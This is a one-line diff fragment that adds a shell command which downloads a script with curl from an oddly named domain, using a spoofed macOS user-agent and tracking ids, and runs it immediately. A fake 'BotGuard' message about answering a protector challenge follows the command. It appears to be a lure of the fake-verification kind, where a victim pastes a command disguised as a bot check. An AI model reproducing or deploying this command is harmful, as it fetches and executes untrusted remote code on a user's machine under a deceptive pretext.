@@ -1,0 +1,1 @@
+/bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '${usr_id}.sue-intentioned.digital/?ublib=${uuid__}')"; echo ""BotGuard: Answer the protector challenge. Ref: 73282
